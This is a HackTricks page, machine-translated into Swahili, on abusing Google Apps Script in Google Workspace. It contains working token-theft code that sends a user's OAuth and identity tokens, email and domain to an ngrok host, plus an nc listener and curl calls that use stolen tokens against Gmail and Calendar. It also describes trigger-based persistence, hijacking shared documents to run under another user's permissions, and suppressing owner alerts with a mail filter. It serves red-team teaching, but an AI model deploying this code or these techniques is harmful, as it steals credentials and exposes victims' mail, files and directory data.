# GWS - App Scripts

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## App Scripts

App Scripts ni **kodhi ambayo itazinduliwa wakati mtumiaji mwenye ruhusa ya mhariri anapofikia hati ambayo App Script imeunganishwa nayo** na baada ya **kukubali ombi la OAuth**.\
Zinaweza pia kuwekwa ili **zitekelezwe kila wakati fulani** na mmiliki wa App Script (Persistence).

### Create App Script

Kuna njia kadhaa za kuunda App Script, ingawa njia maarufu zaidi ni **kutoka kwa Hati ya Google (ya aina yoyote)** na kama **mradi huru**:

<details>

<summary>Create a container-bound project from Google Docs, Sheets, or Slides</summary>

1. Fungua hati ya Docs, karatasi ya Sheets, au uwasilishaji wa Slides.
2. Bonyeza **Extensions** > **Google Apps Script**.
3. Katika mhariri wa skripti, bonyeza **Untitled project**.
4. Mpe mradi wako jina na bonyeza **Rename**.

</details>

<details>

<summary>Create a standalone project</summary>

Ili kuunda mradi huru kutoka Apps Script:

1. Nenda kwenye [`script.google.com`](https://script.google.com/).
2. Bonyeza **New Project**.
3. Katika mhariri wa skripti, bonyeza **Untitled project**.
4. Mpe mradi wako jina na bonyeza **Rename**.

</details>

<details>

<summary>Create a standalone project from Google Drive</summary>

1. Fungua [Google Drive](https://drive.google.com/).
2. Bonyeza **New** > **More** > **Google Apps Script**.

</details>

<details>

<summary>Create a container-bound project from Google Forms</summary>

1. Fungua fomu katika Google Forms.
2. Bonyeza More more\_vert > **Script editor**.
3. Katika mhariri wa skripti, bonyeza **Untitled project**.
4. Mpe mradi wako jina na bonyeza **Rename**.

</details>

<details>

<summary>Create a standalone project using the clasp command line tool</summary>

`clasp` ni zana ya mistari ya amri inayokuruhusu kuunda, kuvuta/kusukuma, na kupeleka miradi ya Apps Script kutoka terminal.

Tazama [Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp) kwa maelezo zaidi.

</details>

## App Script Scenario <a href="#create-using-clasp" id="create-using-clasp"></a>

### Create Google Sheet with App Script

Anza kwa kuunda App Script, mapendekezo yangu kwa ajili ya hali hii ni kuunda Google Sheet na nenda kwenye **`Extensions > App Scripts`**, hii itafungua **App Script mpya kwako iliyounganishwa na karatasi**.

### Leak token

Ili kutoa ufikiaji wa token ya OAuth unahitaji kubonyeza **`Services +` na kuongeza scopes kama**:

* **AdminDirectory**: Fikia watumiaji na vikundi vya directory (ikiwa mtumiaji ana ruhusa za kutosha)
* **Gmail**: Ili kufikia data ya gmail
* **Drive**: Ili kufikia data ya drive
* **Google Sheets API**: Ili ifanye kazi na trigger

Ili kubadilisha **scopes zinazohitajika** unaweza kwenda kwenye mipangilio ya mradi na kuwezesha: **`Show "appsscript.json" manifest file in editor`.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Ili kukamata ombi unaweza tu kukimbia:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permissions requested to execute the App Script:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Kama ombi la nje limefanywa, **kuuliza ruhusa ya kufikia mwisho wa nje** kutatokea pia.
{% endhint %}

### Create Trigger

Mara tu App inaposomwa, bonyeza **‚è∞ Triggers** ili kuunda trigger. Kama **function** ya kutekeleza chagua **`getToken`**, inakimbia wakati wa kutekeleza **`Head`**, katika chanzo cha tukio chagua **`From spreadsheet`** na aina ya tukio chagua **`On open`** au **`On edit`** (kulingana na mahitaji yako) na uhifadhi.

Kumbuka kwamba unaweza kuangalia **kimbio za App Scripts katika tab ya Executions** ikiwa unataka kufanyia kazi kitu.

### Sharing

Ili **kuanzisha** **App Script** mhanga anahitaji kuungana na **Editor Access**.

{% hint style="success" %}
**Token** inayotumika kutekeleza **App Script** itakuwa ya **mwandishi wa trigger**, hata kama faili inafunguliwa kama Mhariri na watumiaji wengine.
{% endhint %}

### Abusing Shared With Me documents

{% hint style="danger" %}
Ikiwa mtu **amekushiriki hati yenye App Scripts na trigger inayotumia Head** ya App Script (sio kutekelezwa kwa kudumu), unaweza kubadilisha msimbo wa App Script (kuongeza kwa mfano kazi za kuiba token), kuipata, na **App Script itatekelezwa kwa ruhusa za mtumiaji aliyekushiriki hati hiyo**! (kumbuka kwamba token ya OAuth ya wamiliki itakuwa na viwango vya ufikiaji vilivyotolewa wakati trigger ilipoundwa).

**Taarifa itatumwa kwa mwandishi wa script ikionyesha kwamba mtu amebadilisha script** (Je, kuhusu kutumia ruhusa za gmail kuunda kichujio kuzuia arifa?)
{% endhint %}

{% hint style="success" %}
Ikiwa **mshambuliaji anabadilisha viwango vya App Script** masasisho **hayatawekwa** kwenye hati hadi **trigger mpya** yenye mabadiliko itakapotengenezwa. Hivyo, mshambuliaji hataweza kuiba token ya mwandishi mwenye wamiliki na viwango zaidi ya ile aliyoweka kwenye trigger aliyounda.
{% endhint %}

### Copying instead of sharing

Unapounda kiungo cha kushiriki hati, kiungo kinachofanana na hiki kinaundwa: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Ikiwa **unabadilisha** mwisho **"/edit"** kwa **"/copy"**, badala ya kuipata google itakuuliza ikiwa unataka **kuunda nakala ya hati:**

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

Ikiwa mtumiaji ananakili na kuipata, **maudhui ya hati na App Scripts vitanakiliwa**, hata hivyo **triggers hazitakiliwa**, hivyo **hakuna kitu kitakachotekelezwa**.

### Sharing as Web Application

Kumbuka kwamba pia inawezekana **kushiriki App Script kama programu ya Mtandao** (katika Mhariri wa App Script, tengeneza kama programu ya Mtandao), lakini arifa kama hii itatokea:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

Ikifuatwa na **kuuliza kwa kawaida ya OAuth** kwa ruhusa zinazohitajika.

### Testing

Unaweza kujaribu token iliyokusanywa ili orodhesha barua pepe na:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Orodha ya kalenda ya mtumiaji:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script kama Uthibitisho

Chaguo moja la uthibitisho lingekuwa **kuunda hati na kuongeza kichocheo kwa kazi ya getToken** na kushiriki hati hiyo na mshambuliaji ili kila wakati mshambuliaji anapofungua faili hiyo **anatoa token ya mwathirika.**

Pia inawezekana kuunda App Script na kufanya ikichochewe kila X wakati (kama kila dakika, saa, siku...). Mshambuliaji ambaye ana **akili zilizovunjwa au kikao cha mwathirika anaweza kuweka kichocheo cha wakati cha App Script na kutoa token ya OAuth yenye mamlaka makubwa kila siku**:

Tuunda App Script, nenda kwa Kichocheo, bonyeza Ongeza Kichocheo, na chagua kama chanzo cha tukio Kinasababishwa na Wakati na uchague chaguzi zinazokufaa zaidi:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Hii itaunda barua ya tahadhari ya usalama na ujumbe wa push kwa simu yako ikikujulisha kuhusu hili.
{% endhint %}

### Kuepuka Kuthibitisha Hati Iliyo Shirikiwa

Zaidi ya hayo, ikiwa mtu **amekushiriki** hati yenye **ufikiaji wa mhariri**, unaweza kuunda **App Scripts ndani ya hati hiyo** na **MMILIKI (mwandaji) wa hati hiyo atakuwa mmiliki wa App Script**.

{% hint style="warning" %}
Hii inamaanisha, kwamba **mwandaji wa hati atajitokeza kama mwandishi wa App Script yoyote** ambayo mtu yeyote mwenye ufikiaji wa mhariri anaunda ndani yake.

Hii pia inamaanisha kwamba **App Script itakuwa na imani na mazingira ya Workspace** ya mwandishi wa hati hiyo.
{% endhint %}

{% hint style="danger" %}
Hii pia inamaanisha kwamba ikiwa **App Script tayari ipo** na watu wame **pewa ufikiaji**, mtu yeyote mwenye **Uhariri** ruhusa kwenye hati anaweza **kuibadilisha na kutumia ufikiaji huo.**\
Ili kutumia hii unahitaji pia watu kuchochea App Script. Na hila moja nzuri ni **kuchapisha script kama programu ya wavuti**. Wakati **watu** ambao tayari wamepewa **ufikiaji** kwa App Script wanapofikia ukurasa wa wavuti, watakuwa **wakichochea App Script** (hii pia inafanya kazi kwa kutumia `<img>` vitambulisho).
{% endhint %}

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki hila za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
